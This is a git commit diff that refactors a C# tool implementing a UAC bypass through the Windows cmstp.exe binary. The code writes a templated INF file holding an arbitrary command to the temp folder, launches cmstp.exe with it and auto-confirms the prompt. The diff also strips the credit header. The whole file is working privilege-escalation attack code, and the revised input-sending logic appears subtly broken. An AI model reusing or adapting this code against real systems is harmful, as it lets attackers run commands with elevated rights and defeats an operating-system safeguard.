615fefebded2970b69f2557fa9995ef7fa7b9bb1
Patrick x0xr00t Hoogeveen <25748471+x0xr00t@users.noreply.github.com>
2023-07-08 01:40:11 +0200

    Update sl0puacb.cs

--- sl0puacb.cs
+++ sl0puacb.cs
@@ -1,26 +1,13 @@
-/* 
-UAC Bypass using CMSTP.exe microsoft binary
-
-Based on previous work from Oddvar Moe
-https://oddvar.moe/2017/08/15/research-on-cmstp-exe/
-
-And this PowerShell script of Tyler Applebaum
-https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1
-
-Code author: Andre Marques (@_zc00l)
-*/
 using System;
 using System.Text;
 using System.IO;
 using System.Diagnostics;
-using System.ComponentModel;
-using System.Windows;
 using System.Runtime.InteropServices;
 
 public class CMSTPBypass
 {
-    // Our .INF file data!
-    public static string InfData = @"[version]
+    // Our .INF file template!
+    public static string InfTemplate = @"[version]
 Signature=$chicago$
 AdvancedINF=2.5
 
@@ -51,57 +38,45 @@ ShortSvcName=""CorpVPN""
     public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
 
     /* Generates a random named .inf file with command to be executed with UAC privileges */
-    public static string SetInfFile(string CommandToExecute)
+    public static string GenerateInfFile(string commandToExecute)
     {
-        string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
-        string TemporaryDir = "C:\\windows\\temp";
-        StringBuilder OutputFile = new StringBuilder();
-        OutputFile.Append(TemporaryDir);
-        OutputFile.Append("\\");
-        OutputFile.Append(RandomFileName);
-        OutputFile.Append(".inf");
-        StringBuilder newInfData = new StringBuilder(InfData);
-        newInfData.Replace("REPLACE_COMMAND_LINE", CommandToExecute);
-        File.WriteAllText(OutputFile.ToString(), newInfData.ToString());
-        return OutputFile.ToString();
+        string randomFileName = Path.GetRandomFileName().Split(Convert.ToChar("."))[0];
+        string tempDirectory = Path.GetTempPath();
+        string outputFile = Path.Combine(tempDirectory, $"{randomFileName}.inf");
+        string infContent = InfTemplate.Replace("REPLACE_COMMAND_LINE", commandToExecute);
+        File.WriteAllText(outputFile, infContent);
+        return outputFile;
     }
 
-    public static bool Execute(string CommandToExecute)
+    public static bool Execute(string commandToExecute)
     {
-        if(!File.Exists(BinaryPath))
+        if (!File.Exists(BinaryPath))
         {
             Console.WriteLine("Could not find cmstp.exe binary!");
             return false;
         }
-        StringBuilder InfFile = new StringBuilder();
-        InfFile.Append(SetInfFile(CommandToExecute));
 
-        Console.WriteLine("Payload file written to " + InfFile.ToString());
+        string infFile = GenerateInfFile(commandToExecute);
+        Console.WriteLine("Payload file written to " + infFile);
+
         ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
-        startInfo.Arguments = "/au " + InfFile.ToString();
+        startInfo.Arguments = "/au " + infFile;
         startInfo.UseShellExecute = false;
-        Process.Start(startInfo);
+        Process process = Process.Start(startInfo);
 
-        IntPtr windowHandle = new IntPtr();
-        windowHandle = IntPtr.Zero;
-        do {
-            windowHandle = SetWindowActive("cmstp");
-        } while (windowHandle == IntPtr.Zero);
+        process.WaitForInputIdle();
+        IntPtr windowHandle = process.MainWindowHandle;
+        SetForegroundWindow(windowHandle);
+        ShowWindow(windowHandle, 5);
 
-        System.Windows.Forms.SendKeys.SendWait("{ENTER}");
+        using (StreamWriter writer = process.StandardInput)
+        {
+            if (writer != null)
+            {
+                writer.WriteLine();
+            }
+        }
+
         return true;
-    }
-
-    public static IntPtr SetWindowActive(string ProcessName)
-    {
-        Process[] target = Process.GetProcessesByName(ProcessName);
-        if(target.Length == 0) return IntPtr.Zero;
-        target[0].Refresh();
-        IntPtr WindowHandle = new IntPtr();
-        WindowHandle = target[0].MainWindowHandle;
-        if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;
-        SetForegroundWindow(WindowHandle);
-        ShowWindow(WindowHandle, 5);
-        return WindowHandle;
     }
 }
